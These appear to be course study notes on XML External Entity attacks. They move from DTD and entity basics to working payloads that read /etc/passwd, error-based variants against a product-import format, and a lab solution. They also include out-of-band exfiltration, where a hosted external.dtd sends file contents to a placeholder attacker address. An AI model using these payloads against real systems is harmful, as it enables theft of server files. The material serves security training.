##### XML External Entities

The "<" and ">" characters are reserved for tags. If an XML document needs to include these characters as text, the characters need to be encoded or enclosed in a character data4 (CDATA) section. The format of a CDATA section is as follows.

```
<![CDATA[ content ]]>

```

XML documents can define structures and data types with Document Type Definitions (DTD)5 and Schemas, which instruct the XML parser to enforce certain rules that may dictate which tags are required or what the data types should be.6 If the XML document requires these, the document must contain an inline definition or link to the external DTD or Schema.


1
(Wikipedia, 2021), https://en.wikipedia.org/wiki/Markup_language ↩︎

2
(Wikipedia, 2021), https://en.wikipedia.org/wiki/XML#Tag ↩︎

3
(Wikipedia, 2021), https://en.wikipedia.org/wiki/Well-formed_document ↩︎

4
(Wikipedia, 2021), https://en.wikipedia.org/wiki/CDATA ↩︎

5
(Wikipedia, 2021), https://en.wikipedia.org/wiki/Document_type_definition ↩︎

6
(Wikipedia, 2021), https://en.wikipedia.org/wiki/XML_schema ↩︎


##### XML Entities

DTDs can be used to declare XML entities within an XML document. In very general terms, an XML entity is a data structure containing valid XML code that will be referenced multiple times in a document.

DTDs are defined at the beginning of an XML document with a special DOCTYPE tag as demonstrated below.

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE name [ 
... one or more entities ...
]>
```

####### Internal Entities

```
<!ENTITY name "entity_value">

<!ENTITY test "<entity-value>test value</entity-value>">
```

####### External Entities

```
<!ENTITY name SYSTEM "URI">

<!ENTITY offsecinfo SYSTEM "http://www.offsec.com/company.xml">


<!ENTITY name PUBLIC "public_id" "URI">

<!ENTITY offsecinfo PUBLIC "-//W3C//TEXT companyinfo//EN" "http://www.offsec.com/companyinfo.xml">
```

####### Parameter Entities

```
<!ENTITY % name SYSTEM "URI">

```

In this example, a parameter entity is used along with an internal entity.

```
<!ENTITY % course 'WEB 200'>
<!ENTITY Title 'Offensive Security presents %course;'>

```


```
<?xml version="1.0" ?>
<!DOCTYPE data [
<!ELEMENT data ANY >
<!ENTITY lastname "Replaced">
]>
<Contact>
  <lastName>&lastname;</lastName>
  <firstName>Tom</firstName>
</Contact>
```

###### Retrieving Files

```
<?xml version="1.0"?>
<!DOCTYPE data [
<!ELEMENT data ANY >
<!ENTITY lastname SYSTEM "file:///etc/passwd">
]>
<Contact>
  <lastName>&lastname;</lastName>
  <firstName>Tom</firstName>
</Contact>
```

###### Error-based Testing

If the application parses XML data and saves the results in a database, we can try to force a SQL error based on column data type or length. Alternatively, we could generate an error by forcing the parser to access a file that doesn't exist. We can stack parameter entities so that the contents of the file we want to retrieve are appended to the name of the non-existent file. When we retrieve these responses in the same "channel" or data stream as the exploit, this is known as in-band exfiltration.

###### Out-of-Band Testing

```
<?xml version="1.0"?>
<!DOCTYPE data [
<!ELEMENT data ANY >
<!ENTITY lastname SYSTEM "http://<our ip address>/somefile">
]>
<Contact>
  <lastName>&lastname;</lastName>
  <firstName>Tom</firstName>
</Contact>
```

Sample product XML

```
<?xml version="1.0" encoding="UTF-8"?>
<entity-engine-xml>
	<Product 
		createdStamp="2021-06-04 08:15:49.363" 
		createdTxStamp="2021-06-04 08:15:48.983" 
		description="Giant Widget with Wheels" 
		internalName="Giant Widget variant explosion" 
		isVariant="N" 
		isVirtual="Y" 
		largeImageUrl="/images/products/WG-9943/large.png" 
		lastUpdatedStamp="2021-06-04 08:16:18.521" 
		lastUpdatedTxStamp="2021-06-04 08:16:18.258" 
		longDescription="This giant widget is mobile. It will seat one person safely. The wheels will never rust or break. Quite a unique item." 
		primaryProductCategoryId="202" 
		productId="WG-9943" 
		productName="Giant Widget with variant explosion" 
		productTypeId="FINISHED_GOOD" 
		productWeight="22.000000" 
		quantityIncluded="10.000000" 
		smallImageUrl="/images/products/WG-9943/small.png" 
		virtualVariantMethodEnum="VV_VARIANTTREE"
  />
...
</entity-engine-xml> 
```
Restructured XML:

```
<Product 
  createdStamp="2021-06-04 08:15:49.363" 
  createdTxStamp="2021-06-04 08:15:48.983" 
  description="Giant Widget with Wheels" 
  internalName="Giant Widget variant explosion" 
  isVariant="N" 
  isVirtual="Y" 
  largeImageUrl="/images/products/WG-9943/large.png" 
  lastUpdatedStamp="2021-06-04 08:16:18.521" 
  lastUpdatedTxStamp="2021-06-04 08:16:18.258" 
  primaryProductCategoryId="202" 
  productId="XXE-0001" 
  productName="Giant Widget with variant explosion" 
  productTypeId="FINISHED_GOOD" 
  productWeight="22.000000" 
  quantityIncluded="10.000000" 
  smallImageUrl="/images/products/WG-9943/small.png"   
  virtualVariantMethodEnum="VV_VARIANTTREE"
>
  <longDescription>This giant widget is mobile. It will seat one person safely. The wheels will never rust or break. Quite a unique item.</longDescription>
</Product>
```



XXE Payload:

```
<!DOCTYPE data [
<!ELEMENT data ANY >
<!ENTITY xxe "Vulnerable to XXE">
]>
<entity-engine-xml>
<Product createdStamp="2021-06-04 08:15:49.363" createdTxStamp="2021-06-04 08:15:48.983" description="Giant Widget with Wheels" internalName="Giant Widget variant explosion" isVariant="N" isVirtual="Y" largeImageUrl="/images/products/WG-9943/large.png" lastUpdatedStamp="2021-06-04 08:16:18.521" lastUpdatedTxStamp="2021-06-04 08:16:18.258" primaryProductCategoryId="202" productId="XXE-0001" productName="Giant Widget with variant explosion" productTypeId="FINISHED_GOOD" productWeight="22.000000" quantityIncluded="10.000000" smallImageUrl="/images/products/WG-9943/small.png" virtualVariantMethodEnum="VV_VARIANTTREE">
<longDescription>&xxe;</longDescription>
</Product>
</entity-engine-xml>
```




During one security engagement, we retrieved a file through directory traversal. However, the file content appeared encoded or encrypted. After closely examining the file, we noticed that every line started with an 'F' and every line ended with 'H'. These repeated characters reminded us of XML since every element starts with "<" and ends with ">". Based on this observation, we wrote a Python script that confirmed the data was ROT10 encoded, a variation of the more common, and equally insecure, ROT13.1

###### Updated XXE payload with external entity

```
<!DOCTYPE data [
<!ELEMENT data ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<entity-engine-xml>
<Product createdStamp="2021-06-04 08:15:49.363" createdTxStamp="2021-06-04 08:15:48.983" description="Giant Widget with Wheels" internalName="Giant Widget variant explosion" isVariant="N" isVirtual="Y" largeImageUrl="/images/products/WG-9943/large.png" lastUpdatedStamp="2021-06-04 08:16:18.521" lastUpdatedTxStamp="2021-06-04 08:16:18.258" primaryProductCategoryId="202" productId="XXE-0001" productName="Giant Widget with variant explosion" productTypeId="FINISHED_GOOD" productWeight="22.000000" quantityIncluded="10.000000" smallImageUrl="/images/products/WG-9943/small.png" virtualVariantMethodEnum="VV_VARIANTTREE">
<longDescription>&xxe;</longDescription>
</Product>
</entity-engine-xml>

```

###### Error-Based Exploitation

One way to do this is to place the payload in a field that will cause a validation error. For example, the baseline "Product" example includes several attributes containing timestamps. Assuming the application validates the XML values or uses them in a database, the application might throw an error if we include a value in one of those elements that cannot be parsed as a timestamp.

Let's update our exploit payload, moving the "createdStamp" from an attribute to an element and placing our entity reference there. We'll also remove the entity reference from the "longDescription" element.

```
<!DOCTYPE data [
<!ELEMENT data ANY >
<!ENTITY xxe  SYSTEM "file:///etc/passwd">
]>
<entity-engine-xml>
<Product createdTxStamp="2021-06-04 08:15:48.983" description="Giant Widget with Wheels" internalName="Giant Widget variant explosion" isVariant="N" isVirtual="Y" largeImageUrl="/images/products/WG-9943/large.png" lastUpdatedStamp="2021-06-04 08:16:18.521" lastUpdatedTxStamp="2021-06-04 08:16:18.258" primaryProductCategoryId="202" productId="XXE-0001" productName="Giant Widget with variant explosion" productTypeId="FINISHED_GOOD" productWeight="22.000000" quantityIncluded="10.000000" smallImageUrl="/images/products/WG-9943/small.png" virtualVariantMethodEnum="VV_VARIANTTREE">
<createdStamp>&xxe;</createdStamp>
<longDescription>XXE</longDescription>
</Product>
</entity-engine-xml>
```
We'll remove description as an attribute and replace it as an element with our external entity reference as its value. We also need to update createdStamp with a valid timestamp.

```
<!DOCTYPE data [
<!ELEMENT data ANY >
<!ENTITY xxe  SYSTEM "file:///etc/passwd">
]>
<entity-engine-xml>
<Product createdTxStamp="2021-06-04 08:15:48.983" internalName="Giant Widget variant explosion" isVariant="N" isVirtual="Y" largeImageUrl="/images/products/WG-9943/large.png" lastUpdatedStamp="2021-06-04 08:16:18.521" lastUpdatedTxStamp="2021-06-04 08:16:18.258" primaryProductCategoryId="202" productId="XXE-0001" productName="Giant Widget with variant explosion" productTypeId="FINISHED_GOOD" productWeight="22.000000" quantityIncluded="10.000000" smallImageUrl="/images/products/WG-9943/small.png" virtualVariantMethodEnum="VV_VARIANTTREE">
<createdStamp>2021-06-04 08:15:49</createdStamp>
<description>&xxe;</description>
<longDescription>XXE</longDescription>
</Product>
</entity-engine-xml>
```


Solution:

```
<!DOCTYPE data [
<!ELEMENT data ANY >
<!ENTITY xxe  SYSTEM "file:///root/error.txt">
]>
<entity-engine-xml>
<Product createdTxStamp="2021-06-04 08:15:48.983" internalName="Giant Widget variant explosion" isVariant="N" isVirtual="Y" largeImageUrl="/images/products/WG-9943/large.png" lastUpdatedStamp="2021-06-04 08:16:18.521" lastUpdatedTxStamp="2021-06-04 08:16:18.258" productName="Giant Widget with variant explosion" productTypeId="FINISHED_GOOD" productWeight="22.000000" quantityIncluded="10.000000" smallImageUrl="/images/products/WG-9943/small.png" virtualVariantMethodEnum="VV_VARIANTTREE">
<createdStamp>2021-06-04 08:15:49</createdStamp>
<description>XXE</description>
<longDescription>XXE</longDescription>
<productId>XXE</productId>
<primaryProductCategoryId>&xxe;</primaryProductCategoryId>
</Product>
</entity-engine-xml>
```

###### Out-of-Band Exploitation

For this attack to work, we will need to create and host our own DTD file that contains two entities. We will need to use parameter entities because we need the entities to be processed within the DTD so that they can impact each other. Let's create a file named external.dtd with the following content.

```
<!ENTITY % content SYSTEM "file:///etc/passwd">
<!ENTITY % external "<!ENTITY &#37; exfil SYSTEM 'http://your ip address/out?%content;'>" >
```

We place the file in /var/www/html.

```
cd /var/www/html/
sudo mousepad external.dtd
sudo systemctl start apache2
```

We will also need to update our payload to use these entities. Since we are using parameter entities, we will need to reference them within the DOCTYPE definition.

```
<?xml version="1.0" encoding="utf-8"?> 
<!DOCTYPE oob [
<!ENTITY % base SYSTEM "http://your ip address/external.dtd"> 
%base;
%external;
%exfil;
]>
<entity-engine-xml>
</entity-engine-xml>
```


Let's update external.dtd to target a file that is likely one line and has fewer special characters in it. We will target /etc/timezone.

```
<!ENTITY % content SYSTEM "file:///etc/timezone">
<!ENTITY % external "<!ENTITY &#37; exfil SYSTEM 'http://your ip address/out?%content;'>" >
```

